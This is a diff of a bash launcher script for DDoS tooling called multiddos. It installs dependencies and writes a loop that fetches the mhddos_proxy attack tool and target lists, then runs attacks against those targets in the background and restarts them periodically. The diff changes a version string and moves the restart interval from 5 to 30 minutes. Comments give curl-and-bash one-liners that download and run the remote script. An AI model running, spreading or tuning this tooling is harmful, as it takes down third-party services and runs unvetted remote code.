@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.9h\n"
+clear && echo -e "Loading... v0.9.9k\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -119,7 +119,7 @@ prepare_targets_and_banner
 # create small separate script to re-launch only this small part of code
 cd ~/multidd
 cat > auto_bash.sh << 'EOF'
-# Restart and update everything (mhddos_proxy and targets) every 30 minutes
+# Restart and update mhddos_proxy and targets every 30 minutes
 while true; do
     #install mhddos_proxy
     cd ~/multidd/
@@ -140,7 +140,7 @@ while true; do
         sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
     fi
-sleep 5m
+sleep 30m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 rm -rf ~/multidd/mhddos_proxy/
